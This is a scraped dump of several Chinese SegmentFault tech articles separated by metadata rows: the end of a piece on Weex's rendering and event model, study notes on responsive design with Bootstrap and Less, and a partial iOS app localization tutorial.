<p>Weex 里页面的渲染过程和浏览器的渲染过程类似，整体可以分为【创建前端组件】-&gt; 【构建 Virtual DOM】-&gt;【生成“真实” DOM】-&gt;【发送渲染指令】-&gt;【绘制原生 UI】这五个步骤。前两个步骤发生在前端框架中，第三和第四个步骤在 JS Framework 中处理，最后一步是由原生渲染引擎实现的。下图描绘了页面渲染的大致流程：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k5L?w=2711&amp;h=1080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""render process"" title=""render process""></span></p>
<h4>创建前端组件</h4>
<p>以 Vue.js 为例，页面都是以组件化的形式开发的，整个页面可以划分成多个层层嵌套和平铺的组件。Vue 框架在执行渲染前，会先根据开发时编写的模板创建相应的组件实例，可以称为 Vue Component，它包含了组件的内部数据、生命周期以及 <code>render</code> 函数等。</p>
<p>如果给同一个模板传入多条数据，就会生成多个组件实例，这可以算是组件的复用。如上图所示，假如有一个组件模板和两条数据，渲染时会创建两个 Vue Component 的实例，每个组件实例的内部状态是不一样的。</p>
<h4>构建 Virtual DOM</h4>
<p>Vue Component 的渲染过程，可以简单理解为组件实例执行 <code>render</code> 函数生成 <code>VNode</code> 节点树的过程，也就是构建 Virtual DOM 的生成过程。自定义的组件在这个过程中被展开成了平台支持的节点，例如图中的 <code>VNode</code> 节点都是和平台提供的原生节点一一对应的，它的类型必须在 <a href=""http://weex-project.io/references/components/index.html"" rel=""nofollow noreferrer"">Weex 支持的原生组件</a>范围内。</p>
<h4>生成“真实” DOM</h4>
<p>以上过程在 Weex 和浏览器里都是完全一样的，从生成真实 DOM 这一步开始，Weex 使用了不同的渲染方式。前面提到过 JS Framework 中提供了和 DOM 接口类似的 Weex DOM API，在 Vue 里会使用这些接口将 <code>VNode</code> 渲染生成适用于 Weex 平台的 <code>Element</code> 对象，和 DOM 很像，但并不是“真实”的 DOM。</p>
<h4>发送渲染指令</h4>
<p>在 JS Framework 内部和客户端渲染引擎约定了一系列的指令接口，对应了一个原子的 DOM 操作，如 <code>addElement</code> <code>removeElement</code> <code>updateAttrs</code> <code>updateStyle</code> 等。JS Framework 使用这些接口将自己内部构建的 Element 节点树以渲染指令的形式发给客户端。</p>
<h4>绘制原生 UI</h4>
<p>客户端接收 JS Framework 发送的渲染指令，创建相应的原生组件，最终调用系统提供的接口绘制原生 UI。具体细节这里就不展开了。</p>
<h3>事件的响应过程</h3>
<p>无论是在浏览器还是 Weex 里，事件都是由原生 UI 捕获的，然而事件处理函数都是写在前端里的，所以会有一个传递的过程。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k6i?w=1736&amp;h=956"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""fire event"" title=""fire event""></span></p>
<p>如上图所示，如果在 Vue.js 里某个标签上绑定了事件，会在内部执行 <code>addEventListener</code> 给节点绑定事件，这个接口在 Weex 平台下调用的是 JS Framework 提供的 <code>addEvent</code> 方法向元素上添加事件，传递了事件类型和处理函数。JS Framework 不会立即向客户端发送添加事件的指令，而是把事件类型和处理函数记录下来，节点构建好以后再一起发给客户端，发送的节点中只包含了事件类型，不含事件处理函数。客户端在渲染节点时，如果发现节点上包含事件，就监听原生 UI 上的指定事件。</p>
<p>当原生 UI 监听到用户触发的事件以后，会派发 <code>fireEvent</code> 命令把节点的 ref、事件类型以及事件对象发给 JS Framework。JS Framework 根据 ref 和事件类型找到相应的事件处理函数，并且以事件对象 <code>event</code> 为参数执行事件处理函数。目前 Weex 里的事件模型相对比较简单，并不区分捕获阶段和冒泡阶段，而是只派发给触发了事件的节点，并不向上冒泡，类似 DOM 模型里 level 0 级别的事件。</p>
<p>上述过程里，事件只会绑定一次，但是很可能会触发多次，例如 <code>touchmove</code> 事件，在手指移动过程中，每秒可能会派发几十次，每次事件都对应了一次 <code>fireEvent</code> -&gt; <code>invokeHandler</code> 的处理过程，很容易损伤性能，浏览器也是如此。针对这种情况，可以使用用 expression binding 来将事件处理函数转成表达式，在绑定事件时一起发给客户端，这样客户端在监听到原生事件以后可以直接解析并执行绑定的表达式，而不需要把事件再派发给前端。</p>
<h2>写在最后</h2>
<p>Weex 是一个跨端的技术，涉及的技术面比较多，只从前端或者客户端的某个角度去理解都是不全面的，本文只是以前端开发者的角度介绍了 Weex 其中一部分的功能。如果你对 Weex 的 JS Framework 有什么新的想法和建议，欢迎赐教；对 Weex 有使用心得或者踩坑经历，也欢迎分享。</p>

                ", 详细介绍 Weex 的 JS Framework,1531971895,571,1,652,1,1,https://segmentfault.com/a/1190000013388649
29,1,0,6,"
                    
<h1><strong>前端知识点总结—-响应式</strong></h1>
<h2>1.Responsive Web Page:响应式网页/自适应的网页2010年提出,</h2>
<pre><code> 一个网页，会自动根据用户浏览设备不同，自动必变布局,
 可以被PC/PAD/PHONE 正常浏览

</code></pre>
<h2>2:响应式网页必备</h2>
<p>(1)流式布局                 float:left;<br>   (2)可以改变尺寸图片文字     font-size:1em;<br>   响应式布局不足:代码更加复杂，不适合大型网页</p>
<h2>3:如何测试网页</h2>
<p>(1)使用真实物理设备<br>   (2)使用第三方模拟器软件<br>   (3)使用chrome 内置设备模拟器</p>
<h2>4:如何编写响应式网页</h2>
<pre><code> (1)声明viewport元标签
 &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1""&gt;</code></pre>
<p>viewport 元标签<br>早期3G手机为浏览器大尺寸网页，只能强行页面缩小,<br>导致图片/文字/链接<br>IOS提出”视口”概念:虚拟窗口，大小与设备相同，如<br>浏览大型网页，滑动.<br>Android 也借鉴该概念</p>
<pre><code> width=device-width   视口宽度=设备宽度
  initial-scale=1        表示初始化视频大小1原始大小
 user-scalable=no      用户是不顺可以调整视频大小

 (2)使用流式布局
   实现方法:float:left
</code></pre>
<p>(3)所有容器使用相对尺寸，不用绝对尺寸<br>.container{<br>  /<em>width:500px;</em>/<br>  width:50%;<br>}</p>
<p>(4)所有文字使用相对尺寸，不用绝对尺寸<br>body{<br>  /<em>font-size:12px;</em>/<br>  font-size:2em;<br>}</p>
<p>(5)所有图片使用相对尺寸，不用绝对尺寸<br> img{<br>width:25%;<br>}</p>
<p>(6)（最重要原则）使用CSS3 Media Query技术</p>
<h2>5: CSS3 Media Query技术</h2>
<pre><code>  Media:指浏览网页的设备,如screen(pc/pad/phone),print,tv,tty.
  Media Query:查询当前浏览网页设备类型，以及特性(对比度，尺尺，手持方向等),
  而选择性执行某些css代码，而忽略另外一些.
  媒体查询使用方法两种</code></pre>
<p>(1)    根据媒体查询结果执行不同的css文件</p>
<pre><code>    &lt;link  media=”screen”    href=”1.css”/&gt;
    &lt;link  media=”print”     href=”2.css”/&gt;</code></pre>
<p>(2)    根据媒体查询结果执行css片段中不同部分</p>
<h2>6:自定义响应式布局(重点)</h2>
<p>(1)声明viewport 视口<br>   (2)流式布局<br>   (3)所有容器.文字.图片:相对尺寸不同绝对尺雨<br>   (4)使用CSS3 Media Query</p>
<h2>7: CSS3 Media Query查询方式</h2>
<p>(1)根据媒体查询结果执行不同css文件(少)<br>   (2)根据媒体查询结果执行不同css片段(多)</p>
<pre><code> @media screen and (min-width:768px) and (max-width:991px){</code></pre>
<p>选择器{样式设定}<br>}</p>
<h2>8:Bootstrap 全局样式</h2>
<p>bootstrap: 起步/引导程序<br> 8.1:Twitter Bootstrap 框架<br>   #官方网站 <a href=""http://www.bootcss.com/"" rel=""nofollow noreferrer"">http://www.bootcss.com/</a><br>   Bootstrap是一个HTML/CSS/JS 框架,用于开发响应式布局，移动设备优先项目.<br>   (1)起步<br>   (2)全局CSS样式(重要—{栅格布局})<br>   (3)组件<br>   (4)js插件(图片轮播)<br>   (5)定制—自定义bootstarp 样式<br>   提示:Bootstrap 知识点不难,1000+单词记忆</p>
<p>8.2:起步<br>   下载 css fonts  js<br>   基本模板<br>&lt;html lang=""zh-CN""&gt;<br>language:指定当前网页所使用自然语言,如zh-CN zh-hk en-US ja<br>作用两个:为浏览器的翻译功能确定基础语言，为读屏软件确定基础发音<br>&lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""&gt;<br>扩展HTTP响应头消息<br>指定IE浏览器的兼容性-仅IE浏览器支持可以识别<br>网景&lt;==&gt;微软 IE<br>IE 6  内核6<br>IE 7  内核6/7<br>IE 8  内核6/7/8<br>IE 9  内核6/7/8/9<br>IE 10 内核6/7/8/9/10<br>IE 11内核6/7/8/9/10/11</p>
<p>html5shiv.js<br>第三方编写的js文件，让老IE兼容html5新标签... header..<br>respond.js<br>第三方编写的js文件,让老IE兼容 CSS3 Media Query</p>
<h2>8.3:Bootstrap 全局样式—按钮</h2>
<p>.btn                    按钮的基础样式<br>   .btn-default            白底黑字的按钮<br>   .btn-danger/warning/success/info/primary 五种颜色的按钮<br>   .btn-lg/sm/xs           按钮四种大小<br>   .btn-block              块级按钮</p>
<h2>8.4:Bootstrap 全局样式—图片</h2>
<pre><code>.img-rounded    圆角图片
.img-circle       圆形图片
.img-thumbnail   缩略图
.img-responsive  响应式图片

</code></pre>
<h2>8.5:Bootstrap 全局样式—文本</h2>
<p>.text-danger/success/warning/info/primary  文字颜色<br>.bg-danger/success/warning/info/primary   背景颜色<br>.text-left/center/right/justify              对齐方式<br>.text-uppercase/lowercase/capitalize</p>
<h2>8.6:Bootstrap 全局样式—列表</h2>
<p>.list-unstyle   去除提示符号<br>.list-inline     行内列表</p>
<h2>9:Bootstrap 全局样式-(屏幕分类)</h2>
<pre><code>(1)大型PC屏幕            lg    w&gt;=1200px
(2)中等PC屏幕            md   1200px&gt;w&gt;992px
(3)小型PAD屏幕           sm   992px&gt;w&gt;768px
(4)超小PHONE屏幕        xs    768px&gt;x
</code></pre>
<h2>9.1:Bootstrap 全局样式-表格</h2>
<pre><code>.table
.table-bordered   带边框的表格
.table-striped     隔行变色
.table-hover      带悬停变色
.table-responsive  响应式表[添加特殊要求]

</code></pre>
<p>Bootlint 是Bootstrap官方提供HTML检测工具，检测出网页中常见的HTML/CSS错误，还能检测class层级结构错误!</p>
<h2>9.2：Bootstrap 全局样式-栅格(重点)</h2>
<p>网页布局可用方法:<br>(1)    TABLE布局<br>好处：简单易控制<br>不足: 语义错误,页面渲染效率低</p>
<p>(2)    DIV+CSS布局<br>好处: 语义正确,页面渲染效率高<br>不足: 不容易控制</p>
<p>(3)Bootstrap 栅格<br>   好处:相对简单易于控制，渲染效率高，支持响应式<br>  不足:页面简单</p>
<p>使用方法:<br>(1)    最外层必须使用容器<br>div.container和div.container-fluid</p>
<p>(2)    容器里可以放置任何内容，若想使用栅格，必须div.row<br>.container &gt; .row [行]</p>
<p>(3)    一个.row中不能放置其他内容,只能放置 .col,列中可以放置其它内容<br>.container &gt; .row &gt; .col</p>
<p>(4)     Bootstrap中行默认12均等分，每个列必须指定行中占比</p>
<p>(5)     栅格系统针对不同屏幕提供不同列<br>.col-lg-1/2/3.../12<br>.col-md-1/2/3../12</p>
<pre><code>       .col-sm-1/2./3../12
       .col-xs-1/2./...12
       </code></pre>
<p>(6)    可以使用”列偏移”实现指定列及其后的列向右偏移的效果.<br>如果不足12列居右对齐</p>
<pre><code>   .col-lg-offset-1/2...12
   .col-md-offset-1/2...12
   .col-sm-offset-1/2...12
   .col-xs-offset-1/2...12
   </code></pre>
<p>(7)    需要注意不同屏幕下列的适全性问题<br>.col-xs-*    适用于xs/sm/md/lg 屏幕</p>
<pre><code>   .col-sm-*   适用于 sm/md/lg  屏幕
   .col-md-*   适用于 md/lg 屏幕
   .col-lg-*    适用于 lg 屏幕
   </code></pre>
<p>(8)    一个列可以指定在不同屏幕下的宽度占比<br>div.col-xs-12/.col-sm-9/.col-md-6</p>
<pre><code>   div.col-xs-12/col-md-6
   常见错误:  div.col-xs-6/.col-md-6
   </code></pre>
<p>(9)    一个列可以指定特定的屏幕隐藏</p>
<pre><code>    .hidden-xs  仅在xs屏幕下隐藏
    .hidden-sm 仅在sm屏幕下隐藏
    .hidden-md 仅在md屏幕下隐藏
    .hidden-lg  仅在lg 屏幕下隐藏
    .hidden

</code></pre>
<h2>10:Bootstrap 栅格式系统</h2>
<p>10.1:Bootstrap 表单<br>   (1)默认表单</p>
<pre><code> &lt;form&gt;
     &lt;div class=”form-group”&gt;
       &lt;label class=”control-label”&gt;用户名&lt;/label&gt;
       &lt;input type=”text” class=”form-control”/&gt;
       &lt;span class=”help-block”&gt;用户名格式:6~12位&lt;/span&gt;
     &lt;/div&gt;
 &lt;/form&gt;
</code></pre>
<p>(2)行内表单</p>
<pre><code>  &lt;form&gt;
     &lt;div class=”form-inline”&gt;
       &lt;input type=”text” class=”form-control”/&gt;
       &lt;span class=”sr-only”&gt;用户名格式:6~12位&lt;/span&gt;
     &lt;/div&gt;
 &lt;/form&gt;
</code></pre>
<p>(3)水平表单</p>
<pre><code> 水表表单=表单+栅格系统
 
默认栅格系统    水平表单</code></pre>
<p>最外层元素    div.container    form.form-horizontal<br>行    div.row    div.form-group<br>列    div.col-<em>-</em>    div.col-<em>-</em><br>   &lt;form class=” form-horizontal”&gt;</p>
<pre><code> &lt;div class=”form-group”&gt;
   &lt;div class=”col-*-*”&gt;
         &lt;label class...</code></pre>
<p>&lt;/div&gt;</p>
<pre><code> &lt;/div&gt;</code></pre>
<p>&lt;/form&gt;</p>
<h2>10.2:Bootstrap 组件—(下拉菜单:字体图标:导航条-重点)</h2>
<p>下拉菜单三级结构<br>   &lt;div class=”dropdown”&gt;</p>
<pre><code> &lt;a href=”#” data-toggle=”dropdown”&gt;触发元素&lt;/a&gt;
 &lt;div/ul class=”dropdown-menu”&gt;隐藏元素&lt;/div/ul&gt;</code></pre>
<p>&lt;/div&gt;</p>
<h2>10.3: Bootstrap 组件—(字体图标)</h2>
<p>web项目中常用图标字体<br>   (1)FontAwesome – 675 个免费图标<br>   (2)Glyphicons   - 800  个收费图标<br>   服务器字体使用<br>   (1)web 服务器项目目录下必需有字体文件<br>   (2)css中声明一个新的字体文件，并且指定下载位置</p>
<pre><code> @font-face {
   font-family: 'Glyphicons Halflings';
   src: url('../fonts/glyphicons-halflings-regular.eot');
   src: url('../fonts/glyphicons-halflings-regular.eot?#iefix')   </code></pre>
<p>}<br>   (3)声明一个基础class 使用字体</p>
<pre><code> .glyphicon{
    font-family: 'Glyphicons Halflings';</code></pre>
<p>} <br>   (4)在html页面中输入图标对应编码</p>
<h2>10.4: Bootstrap 组件—(进度条)</h2>
<p>.progress &gt; .progress-bar</p>
<h2>10.5: 面包屑 .bread-crum /徽章/巨幕/水井</h2>
<h2>11:Bootstrap第四部分:jquery插件---折叠(手风琴)</h2>
<pre><code> &lt;a data-toggle=”collapse” href=”my-target1”&gt;触发元素&lt;/a&gt;
 &lt;button data-toggle=”collapse” data-target=”my-target1”&gt;触发元素&lt;/button&gt;
 &lt;div id=”my-target1” class=”collapse in”&gt;展开收起元素&lt;/div&gt;
</code></pre>
<h2>12:弹幕</h2>
<p>1:html</p>
<pre><code> &lt;canvas id=”can1”/&gt; 显示弹幕文字
 &lt;canvas id=”can2”/&gt; 视频画在画布上
 (1)视频按照图片绘制画布上 ctx2.drawImage();
 (2)创建定时器[]/循环绘制视频
 (3)视频元素动态创建追加 body最后子元素并且隐藏</code></pre>
<p>2:js<br>   3:目录结构</p>
<pre><code> index.html
  js/ video.js             完成:视频显示
     data.js             完成:弹幕
     公共函数库文件
  res/1.mp4             视频文件

</code></pre>
<h2>13:Bootstrap js插件---(导航条)</h2>
<p>.navbar-toggle 媒体查询:屏幕宽度大于768px 就隐藏<br>.navbar-collapse 媒体查询:屏幕宽度大于768px 绝对定位在<br>.navbar-header内;否则相对定位.navbar-header</p>
<h2>14:视频项目</h2>
<p>&lt;video src=”” autoplay loop controls muted poster=””<br>preload=””&gt;&lt;/video&gt;<br>video 弱  [不能对视频加密/视频丢失]<br>video 弱 直播不行<br>强 微信 小程序 公众号 [pc/pad/ios/android]</p>
<p>14.1:同层播放 (苹果手机)<br>当点击视频播放,IOS手机默认行为,自动将视频弹出在一个独立，<br>窗口播放.(二个窗口)<br>解决问题:同一层窗口播放视频<br>在&lt;video&gt;标签中添加二个属性<br>webkit-playsinline=""true""   (IOS)让频视在小窗口内播放，<br>能不同跳出全屏播放<br>playsinline=""true""         (IOS)微信浏览器支持小窗口内播放<br>x5-video-player-type=""h5""  (Android)同层播放</p>
<p>示例:<br>&lt;video webkit-playsinline=""true"" playsinline=""true"" <br>x5-video-player-type=""h5"" &gt;&lt;/video&gt;</p>
<p>解决问题: 全屏设置如果不设置如下属性，横屏会错位<br>x5-video-player-fullscreen=""true"" <br>全屏设置对过监听resize事件实现 (Android )<br>x5-video-orientation=""portraint""&gt;</p>
<p>14.2:video 专用样式<br>object-fit:选项 <br>(1)    fill默认  失真<br>(2)    contain   包含(留白)<br>(3)    conver    覆盖(调整视频比例)</p>
<p>14.3:video 事件</p>
<pre><code>  (1)canplaythought  可以播放视频，视频全部加载完成
    #iphone 点击播放
    #android 可以加完成触发事件
  (2)ended  播放结束

</code></pre>
<h2>15:less两种使用方法</h2>
<p>(1)在客户端使用—学习(效率差)<br>编写一个x.less<br>在HTML中引入x.less文件，同时再引入LESS编译程序:<br>less.js<br>客户端请求html,下载x.less以及less.js 在客户端运行js文件<br>less编译为css<br>会减慢客户端样式的呈现速度</p>
<p>(2)在服务器端使用-Less(必需掌握)</p>
<pre><code>编写x.less
在开发电脑安装less编译环境(Nodejs/lessc),执行x.less编译x.css
再编写html文件，引入编译x.css</code></pre>
<p>客户端发出请求html/下载css</p>
<h2>15.1:LESS语法</h2>
<p>(1)Less支持所有CSS语法<br>(2)Less支持多行/单行注释<br>  /**/ 多行注释<br>  //   单行注释—推荐使用(注释内容不会编译css文件)<br>(3) Less 支持(变量)<br>   定义:@变量名:值;<br>   使用:color:@变量名;<br>   变量可以取值为任何合法样式值<br>(4)Less 支持变量和常量算术运算</p>
<ul><li><ul><li><ul><li>/ %</li></ul></li></ul></li></ul>
<p>(5)less支持一个选择器中”混入”另一个选择器的样式<br>  选择器1{...}<br>  选择器2{..   选择器1}<br>(6)less在样式混入时可以指定参数<br>  选择器1(@参数1,@参数2..){}<br>  选择器2{选择器1(值1,值2...)}<br>(7)less支持样式嵌套(<em>*</em>)<br>  选择器1{</p>
<pre><code>选择器2{</code></pre>
<p>}<br>}<br> 上述代码会被编译为:<br> 选择器1{}<br> 选择器 2{}</p>
<h2>15.2:通过修改Bootstrap的less源文件实现定制</h2>
<p>达到三个目标<br>   (1)瘦身:删除不需要样式<br>   (2)粗粒度定制</p>
<pre><code> 只需要修改variables.less中定的变量值即可</code></pre>
<p>(3)细粒度定制 针对某个组件细节修改</p>
<pre><code> 修改组件对应less文件.  dropdown.less

</code></pre>
<h2>15.3:如何实现定制</h2>
<p>(1)下载并且安装nodejs – (js解析器)</p>
<pre><code> 在命令行  node –v  可以看到版本信息</code></pre>
<p>(2)下载less编译程序</p>
<pre><code> e:\node_modules\less\bin\lessc
 示例:
 e:\node_modules\less\bin\lessc  x.less  x.css


</code></pre>
<h2>15.4: 定制Bootstrap</h2>
<p>(1) 查找software/bootstrap/less<br>   (2) e:node_moduleslessbinlessc  less/bootstrap.less  bootstrap.css</p>

                ", 前端知识点总结—-响应式,1531971897,487,1,516,1,1,https://segmentfault.com/a/1190000013369639
30,1,0,6,"
                    
<h2>一. 语言配置</h2>
<p>无论本地化文本、图片、xib/storyboard，都需要配置本地化的语言，操作步骤如图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229527?w=864&amp;h=493"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
<p>点击“+”之后弹出对话框如图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229528?w=764&amp;h=464"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
<p>Main.storyboard和LaunchScreen.storyboard至少选择一个，如果选择的文件无用，那么在Finish之后删除即可。否则添加语言配置不成功。</p>
<h2>二. 应用程序名称</h2>
<ol>
<li>在语言配置好之后，新建资源文件（文件名必须为InfoPlist.strings)：Xcode -&gt; File -&gt; New File -&gt; Resource -&gt; Strings File。</li>
<li>本地化资源文件：选中InfoPlist.strings文件 -&gt; File Inspection（Xcode右侧面板的文件检查器) -&gt; Localize 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229529?w=956&amp;h=165"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>生成相应的语言文件：选中InfoPlist.strings文件 -&gt; File Inspection（Xcode右侧面板的文件检查器) -&gt; 勾选相应的语言文件，InfoPlist.strings下会多出相应的语言文件 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229530?w=816&amp;h=74"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>在相应的语言文件中添加本地化的文本（key/value形式）， 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229531?w=847&amp;h=186"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span><br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229532?w=722&amp;h=191"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>App启动时根据系统语言加载相应语言的InfoPlist.strings， 本地化处理过的文本可以进行相应语言的显示。</li>
<li>如果前5步之后仍不能达到效果,编辑Info.plist，添加一个新的属性Application has localized display name, 设置其类型为Boolean，并将其value设置为YES。</li>
</ol>
<h2>三. 文本</h2>
<ol>
<li>在语言配置好之后，新建资源文件（文件名：系统默认Localizable.strings)：Xcode -&gt; File -&gt; New File -&gt; Resource -&gt; Strings File，文本显示时，默认文件名用NSLocalizedString(key, comment)，如果自定义文件名需用NSLocalizedStringFromTable(key, tbl, comment)，其中tbl即为文件名。</li>
<li>本地化资源文件：选中Localizable.strings文件 -&gt; File Inspection（Xcode右侧面板的文件检查器) -&gt; Localize 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229533?w=1058&amp;h=193"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>生成相应的语言文件：选中Localizable.strings文件 -&gt; File Inspection（Xcode右侧面板的文件检查器) -&gt; 勾选相应的语言文件，Localizable.strings下会多出相应的语言文件 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229534?w=938&amp;h=81"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>在相应的语言文件中添加本地化的文本（key/value形式）， 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229535?w=930&amp;h=233"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span><br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229536?w=875&amp;h=234"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>项目中应用：NSLocalizedString(key, comment)或者NSLocalizedStringFromTable(key,文件名, comment)，key即Localizable.strings中自己定义的key,comment即备注，可为nil。如图<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229537?w=913&amp;h=60"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>App启动时根据系统语言加载相应语言的Localizable.strings， 本地化处理过的文本可以进行相应语言的显示。系统根据某个key在Localizable.strings获取对应的字符串时，如果没有找到，那么就会以key作为value返回。</li>
<li>Edit Scheme -&gt; Options -&gt; Application Language 可以修改此项目的语言环境，不需要每次修改设备的语言环境。如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229538?w=890&amp;h=491"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
</ol>
<h2>四. 图片</h2>
<p>由于iOS中不支持Assets.xcassets的本地化，图片的本地化主要有两种方式：①本地化图片名字，② 本地化图片文件</p>
<ul>
<li>
<p>本地化图片名字（参考本地化文本）,代码如下：</p>
<pre><code class=""objc"">NSString *imageName = NSLocalizedString(@""icon"", nil);
UIImage *image = [UIImage imageNamed:imageName];</code></pre>
</li>
<li>
<p>本地化图片文件</p>
<ol>
<li>本地化资源文件：选中图片 -&gt;  File Inspection（Xcode右侧面板的文件检查器) -&gt; Localize 如图：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229539?w=1115&amp;h=228"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span>
</li>
<li>生成相应的语言文件：选中图片文件 -&gt; File Inspection（Xcode右侧面板的文件检查器) -&gt; 勾选相应的语言文件，图片文件下会多出相应的语言文件 如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229540?w=932&amp;h=216"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>选中图片文件 -&gt; Show In Finder，发现本地化的文件根据语言类型分别在不同的目录中，针对图片可以进行替换<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229541?w=523&amp;h=225"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
<li>图片替换之后，启动时会根据语言环境加载相应的图片资源。</li>
<li>Edit Scheme -&gt; Options -&gt; Application Language 可以修改此项目的语言环境，不需要每次修改设备的语言环境。如图：<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013229538?w=890&amp;h=491"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
</li>
</ol>
</li>
</ul>
<h2>五. 启动图</h2>
<p>iOS 启动图配置有三种方式：①导入图片文件，并且配置Info.plist,② Launch Image Source (Assets),③ LaunchScreen File。但是第② 种暂不支持本地化。<strong>启动图可行的两种方式，都依赖于Info.plist文件的配置。</strong></p>
<ul><li>
<p>引入图片文件且配置Info.plist</p>
<ol>
<li>首先将Launch Screen File置空，并且不选择Launch Image Source (Asset)</li>
<li>此方法类似图片的本地化（本地化图片文件），额外的需要在Info.plist文件中配置，</li>
<li>图片规格和plist配置结构（类比Assets中的 Launch Image），可以在Assets中配置Launch Image后，App运行时打印Info.plist 查看 ，举例如下：：</li>
</ol>
<pre><code class=""xml"">&lt;key&gt;UILaunchImages&lt;/key&gt;
 &lt;array&gt;
     &lt;dict&gt;
         &lt;key&gt;UILaunchImageMinimumOSVersion&lt;/key&gt;
         &lt;string&gt;8.0&lt;/string&gt;
         &lt;key&gt;UILaunchImageName&lt;/key&gt;
         &lt;string&gt;bubble_mine_green&lt;/string&gt;
         &lt;key&gt;UILaunchImageOrientation&lt;/key&gt;
         &lt;string&gt;Portrait&lt;/string&gt;
         &lt;key&gt;UILaunchImageSize&lt;/key&gt;
         &lt;string&gt;{414, 736}&lt;/string&gt;
     &lt;/dict&gt;
 &lt;/array&gt;</code></pre>
</li></ul>
<p><em>注意：目前手机只有iPhone plus(5.5)和iPhone X <strong>额外</strong>支持横屏启动图配置，其它设备默认加载竖图，具体查看Assets中的LaunchImages可配置的启动图。</em></p>
<ul><li>
<p>LaunchScreen File</p>
<ol>
<li>本地化LaunchScreen.storyboard，类似本地化图片文件步骤，经测试此方法不可行（不能根据系统语言环境自动加载对应的本地化文件），猜测苹果不赞成不支持本地化，普通的xib/storyboard文件也不支持图片的本地化（参见下一节：六. xib/storyboard）。</li>
<li>
<p>创建两个LaunchScreen.文件，一个文件名为LaunchScreen-English，一个文件名LaunchScreen-Chinese，参考应用程序名称本地化，在InfoPlist.strings 配置Info.plist,如下：</p>
<pre><code class=""objc"">""UILaunchStoryboardName"" = ""LaunchScreen-Chinese"";
""UILaunchStoryboardName"" = ""LaunchScreen-English"";</code></pre>
</li>
</ol>
</li></ul>
<h2>六. xib/storyboard</h2>
<p>本地化XXX.storyboard，操作步骤与本地化图片文件相同，但是storyboard内容的本地化发现只支持文本，并且xib/storyboard 元素较多，内容也较复杂。每次控件内容的修改都要同步到其它语言环境上。整理方法如下：</p>
<ol>
<li>可以在修改Base环境界面上的元素之后（最好暂存一下，以防后续操作失败），先勾选掉其它语言环境的文件，再勾选切换重新生成（Replace file）storyboard，但是需要<strong>重新</strong>填写每种语言的本地化文本。如图<br><span class=""img-wrap""><img data-src=""/img/remote/1460000013229542?w=416&amp;h=141"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span>
</li>
<li>
<p>可以Base文件中查看ObjectID，在原来语言文件的基础之上，对新添加控件依据格式进行<strong>补充</strong>整理：</p>
<pre><code class=""objc"">/* Class = ""UILabel""; text = ""Label""; ObjectID = ""fSz-Ci-UcW""; */
""fSz-Ci-UcW.text"" = ""Label"";</code></pre>
</li>
<li>
<p>终端利用工具ibtool,此方法类似第1条的重新勾选Replace file，都需要重新填写本地化文本</p>
<ul>
<li>进入Base.lproj文件的目录：</li>
<li>
<p>用命令行工具ibtool根据Base文件产生一个.strings文件，对比新的.strings文件，在原来语言文件的基础之上，对新添加控件依据格式进行<strong>补充</strong>整理，命令举例如下：</p>
<pre><code>ibtool Main.storyboard --generate-strings-file ./temp.strings
</code></pre>
</li>
<li>修改.strings文件中的字符串，类似重新填写本地化文本的操作</li>
<li>
<p>用命令行工具ibtool根据字符串文件重新生成对应语言的storyboard，命令举例如下</p>
<pre><code>ibtool --strings-file temp.strings --write ../zh-Hans.lproj/Main.storyboard Main.storyboard</code></pre>
</li>
</ul>
</li>
<li>
